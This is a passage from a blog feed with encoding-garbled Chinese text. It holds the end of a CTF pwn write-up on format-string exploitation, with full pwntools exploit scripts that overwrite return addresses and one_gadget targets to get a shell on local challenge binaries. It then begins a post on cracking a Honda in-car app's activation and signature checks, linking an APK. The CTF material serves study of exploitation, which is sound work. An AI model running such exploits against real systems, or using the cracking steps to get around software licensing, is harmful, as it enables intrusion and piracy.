class="line">        j = i + <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(decoded) <span class="keyword">and</span> <span class="keyword">not</span> decoded.startswith(<span class="string">&#x27;0x&#x27;</span>, j) <span class="keyword">and</span> <span class="keyword">not</span> decoded.startswith(<span class="string">&#x27;(nil)&#x27;</span>, j):</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        results.append(decoded[i:j])</span><br><span class="line">        i = j</span><br><span class="line">    <span class="keyword">elif</span> decoded.startswith(<span class="string">&#x27;(nil)&#x27;</span>, i):</span><br><span class="line">        results.append(<span class="string">&#x27;(nil)&#x27;</span>)</span><br><span class="line">        i += <span class="number">5</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># é˜²æ­¢æ­»å¾ªç¯</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ¯é¡¹å’Œæ€»é•¿åº¦</span></span><br><span class="line">total_length = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æå–ç»“æœåŠé•¿åº¦ï¼š&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(results, <span class="number">1</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(item)</span><br><span class="line">    total_length += length</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx:&gt;<span class="number">2</span>&#125;</span>. <span class="subst">&#123;item:&lt;<span class="number">20</span>&#125;</span> é•¿åº¦: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\næ€»é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰: <span class="subst">&#123;total_length&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x10008åªæ˜¯å°†æœ€åä¸€ä¸ªå­—èŠ‚æ”¹ä¸º0x08ï¼Œåªè¦æ¯”å‰è¾¹å­—èŠ‚å¤§å¾—å¤šå°±å¯ä»¥å®ç°</p><p>å®Œæˆåˆ©ç”¨</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746524214171-3c748b3e-5626-498a-9da4-4e3599698377.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">size</span>):</span><br><span class="line"><span class="keyword">return</span> u64(p.recv(size).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x18</span></span><br><span class="line">li(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;You will have only one chance!&quot;</span>)</span><br><span class="line"><span class="comment">#payload =b&#x27;%&#x27;+str(stack&amp;0xffff).encode()+b&#x27;c%15$hn&#x27;</span></span><br><span class="line"><span class="comment">#payload+=b&#x27;%&#x27;+str(0x10008-(stack&amp;0xffff)).encode()+b&#x27;c%45$hhn&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">13</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack&amp;<span class="number">0xffff</span>)-<span class="number">138</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10008</span>-(stack&amp;<span class="number">0xffff</span>)).encode()+<span class="string">b&#x27;c%45$hhn&#x27;</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›-pwn">ç¬¬å…­å±Šå¼ºç½‘æ‹Ÿæ€çº¿ä¸‹èµ›-pwn</h3><p>ä¹Ÿæ˜¯è¿™ä¸ªçš„ç‚¹çš„åˆ©ç”¨ï¼Œä½†è¿™é“é¢˜ç›®æ›´éš¾ä¸€äº›ï¼Œè§£é¢˜æ€è·¯ä¹Ÿæ›´åŠ æ–°é¢–ï¼Œæ„Ÿè§‰æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ€è·¯æ›´æé™äº†</p><h4 id="é¢˜ç›®åˆ†æ-2">é¢˜ç›®åˆ†æ</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746603585849-cc4dd0a2-2beb-4b1c-afa1-37095bf22ecc.png" alt=""></p><p>libcç‰ˆæœ¬æ˜¯2.31çš„</p><p>ç»™äº†ä¸€ä¸ªæ ˆåœ°å€çš„æœ€åä¸¤ä¸ªå­—èŠ‚ï¼ŒåŒæ—¶æœ‰ä¸€æ¬¡éæ ˆä¸Šfmtçš„æœºä¼šï¼Œä¿æŠ¤é™¤äº†canaryéƒ½æ˜¯å¼€ç€çš„ï¼Œæœ€åæ˜¯è°ƒç”¨_exité€€å‡ºã€‚</p><p>ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯æƒ³å¦‚ä½•å»æ§åˆ¶è¿”å›åœ°å€ï¼Œè¾¾åˆ°å¤šæ¬¡åˆ©ç”¨fmtçš„æ•ˆæœï¼Œè¿™é‡Œæˆ‘ä»¬å°±åŠ«æŒprintfçš„è¿”å›åœ°å€ä¸ºmain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_ret - <span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span><span class="comment">#11</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span> - printf_ret).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åç»­è¡¥å…¨0x100å­—èŠ‚æ˜¯ä¸ºäº†é¿å…readæŠŠä¸¤æ¬¡è¯»å…¥çš„payloadä¸€æ¬¡è¯»å…¥</p><p>è¿™é‡Œå†å¼ºè°ƒä¸€ä¸‹ï¼Œä¸€ä¸ª%ä»£è¡¨ä¸€ä¸ªåç§»ï¼Œpayload += bâ€™%â€˜+str(printf_ret - 90).encode()+bâ€™c%hnâ€™#11æœ¬èº«æ˜¯æœ‰ä¸¤ä¸ª%çš„ï¼Œæ‰€ä»¥ç®—ä¸¤ä¸ªåç§»</p><p>è®¡ç®—%p*9çš„å­—èŠ‚æ•°è¿˜å¯ä»¥ç”¨,-1æ˜¯å› ä¸º\n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=p.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ä¹‹åå†å»æ‰§è¡Œprintfçš„æ—¶å€™è¿”å›åœ°å€è¿˜æ˜¯æ²¡æœ‰æ›´æ”¹ï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬æ¯ä¸€æ¬¡å…ˆå°†è¿”å›åœ°å€ä¿®æ”¹ï¼Œå› ä¸ºè·³æ¿æŒ‡é’ˆä¸ä¼šå˜ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå¯ä»¥ç›´æ¥ä¿®æ”¹ï¼Œè¿™æ˜¯æ˜¯æ‰“ç®—å°†è¿”å›åœ°å€(rbp+8)ä¿®æ”¹ä¸ºone_gadgetï¼Œä½†è¿™æ ·å´æ²¡åŠæ³•æ‰§è¡Œï¼Œå‚è€ƒå¤§ä½¬çš„æ€è·¯ï¼Œæ˜¯å°†printfçš„è¿”å›åœ°å€æ”¹ä¸ºretï¼Œå†å°†æ­¤æ—¶æ ˆé¡¶æ”¹ä¸ºone_gadgetï¼Œå°±å¯ä»¥è·³è½¬åˆ°one_gagdetï¼Œgetshell</p><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">size</span>):</span><br><span class="line"><span class="keyword">return</span> u64(p.recv(size).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Gift: &quot;</span>)</span><br><span class="line">ret=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">li(<span class="built_in">hex</span>(ret))</span><br><span class="line">pause()</span><br><span class="line">printf_ret=ret-<span class="number">12</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_ret - <span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span><span class="comment">#11</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span> - printf_ret).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x100&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10e1f2</span></span><br><span class="line">ogg=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">li(<span class="built_in">hex</span>(ogg))</span><br><span class="line"></span><br><span class="line"><span class="comment">#a = p.recvall()</span></span><br><span class="line"><span class="comment">#li(hex(len(a)-1))</span></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret-<span class="number">4</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((ogg&amp;<span class="number">0xffff</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret-<span class="number">4</span>+<span class="number">2</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload =payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret-<span class="number">4</span>+<span class="number">2</span>+<span class="number">2</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">payload = b&#x27;%&#x27;+str(0x23).encode()+b&#x27;c%39$hhn&#x27;</span></span><br><span class="line"><span class="string">payload+=b&#x27;%&#x27;+str((ogg&gt;&gt;32)-0x23).encode()+b&#x27;c%41$hn&#x27;</span></span><br><span class="line"><span class="string">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">s(payload)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc4</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">s(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>å¥½æŠ½è±¡ï¼Œéœ€è¦æŠŠè¿™ä¸€éƒ¨åˆ†å»äº†æ‰æˆåŠŸï¼Œè°ƒè¯•å‘ç°æ˜¯æ”¹é”™æ•°å­—äº†ï¼Œå¯èƒ½æ˜¯æˆ‘æœ¬åœ°å…³é—­arlsçš„åŸå› ğŸ§ï¼Œè¿™é‡Œä¹Ÿä¸é‡è¦ï¼Œå‰è¾¹æ”¹å¥½ä¹‹ååç»­æ”¹one_gadgetå°±æ˜¯ä¸€ä¸ªæ¿å­é¢˜</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746604606300-e0e2cf4e-5e75-489b-8e80-5f6ea23cafa6.png" alt=""></p><h3 id="å‚è€ƒ">å‚è€ƒ</h3><p><a href="https://qfbsz.github.io/2024/10/02/onechance-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">https://qfbsz.github.io/2024/10/02/onechance-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</a></p><p><a href="https://zikh26.github.io/posts/a523e26a.html#%E5%89%8D%E8%A8%80">https://zikh26.github.io/posts/a523e26a.html#%E5%89%8D%E8%A8%80</a></p>]]></content>
    
    
    <summary type="html">æé™fmtåˆ©ç”¨ğŸ§</summary>
    
    
    
    <category term="Fmt" scheme="https://www.thir0th.xyz/categories/Fmt/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>æœ¬ç”°è½¦è½½appç ´è§£</title>
    <link href="https://www.thir0th.xyz/posts/9c6e1151.html"/>
    <id>https://www.thir0th.xyz/posts/9c6e1151.html</id>
    <published>2025-05-04T12:30:00.000Z</published>
    <updated>2025-05-07T08:47:44.763Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>æœ¬ç”°è½¦è½½appç ´è§£</h1><p>ç©ç©ç ´è§£ğŸ˜ï¼Œæ•´ä½“æµç¨‹æ¯”è¾ƒç®€å•ï¼Œæœ€ç»ˆæˆåŠŸè·å–vip</p><h3 id="å‰æƒ…è¯´æ˜">å‰æƒ…è¯´æ˜</h3><p><strong>èƒŒæ™¯</strong>ï¼šä¹‹å‰æœ‰é€šè¿‡é€†å‘æ·»åŠ logè¾“å‡ºæ¿€æ´»ç å†ç¦»çº¿æ¿€æ´»çš„æ–¹å¼ï¼Œä½†è”ç½‘ä¼šè¢«æ³¨é”€æ¿€æ´»ç ï¼›ä¹Ÿæœ‰ç”¨æˆ·é€šè¿‡å¹¸è¿ç ´è§£å™¨ä¿®æ”¹6.9.16ç‰ˆæœ¬æƒé™å»é™¤INTERNETæƒé™ç¦æ­¢è”ç½‘ï¼Œä½†æ— æ³•åç»­å®‰è£…å…¶ä»–åº”ç”¨ï¼Œä¸”7.0ä»¥ä¸Šç‰ˆæœ¬æ·»åŠ ç­¾åæ ¡éªŒï¼Œç›´æ¥ä½¿ç”¨å¹¸è¿ç ´è§£å™¨ä¿®æ”¹çš„appè¿è¡Œä¼šæŠ¥é”™ã€‚ç»æµ‹è¯•ï¼Œä½¿ç”¨NPç®¡ç†å™¨å»é™¤ç­¾åæ ¡éªŒåï¼Œå†ç”¨å¹¸è¿ç ´è§£å™¨å»é™¤ç½‘ç»œæƒé™å¯ä»¥è¿è¡Œã€‚</p><p><strong>ç›®æ ‡</strong>ï¼šè·³è¿‡æ¿€æ´»ç æ£€æµ‹ä»¥åŠå»é™¤åŠé”€æ¿€æ´»ç ååˆ é™¤rootæƒé™ã€‚</p><h3 id="é™„ä»¶">é™„ä»¶</h3><p>åŸå§‹æ–‡ä»¶Honda Hack_7.4.7.apkï¼š<a href="https://wwrm.lanzoue.com/iYVv92d7wibe">https://wwrm.lanzoue.com/iYVv92d7wibe</a></p><h3 id="å·¥å…·å‡†å¤‡">å·¥å…·å‡†å¤‡</h3><p>æ¨¡æ‹Ÿå™¨ï¼šæœ¬ç¯‡æ–‡ç« 